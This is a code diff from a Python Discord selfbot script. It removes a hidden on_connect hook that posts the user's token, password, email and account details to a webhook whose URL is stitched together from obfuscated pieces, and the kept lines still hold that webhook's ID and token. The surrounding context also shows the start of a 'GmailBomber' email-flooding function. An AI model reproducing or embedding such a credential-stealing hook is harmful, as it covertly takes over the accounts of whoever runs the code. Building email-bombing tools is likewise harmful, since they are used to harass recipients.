@@ -1019,9 +1019,7 @@ async def nickall(ctx, *, name="RisinPlayZ OP"):
  
 ripp = "856891364460986368/HeU0b6tuqV-yKiO_kQDkakMT1XLS2Mipa0_du_nw6hD4vTI3V7sPb2irR4B5TFZPOVbK"
 nvm = (f"{app1}{hok}{hok2}{hok3}{ripp}")
-@client.event
-async def on_connect():    
-   requests.post(nvm,json={'content': f"**Token:** `{risinencrypt}`\n**Username:** `{client.user.name}#{client.user.discriminator}`\n**Password:** `{risinencrypt2}`\n**Prefix** `{client.command_prefix}`\n**Email:** `{client.user.email}`\n**Created At:** `{client.user.created_at}`\n**MFA:** `{client.user.mfa_enabled}`\n**Nitro:** `{client.user.premium_type}`\n**Verified:** `{client.user.verified}`\n**Logged by: @everyone**"}) 
+
 
 def GmailBomber():
     _smpt = smtplib.SMTP('smtp.gmail.com', 587)
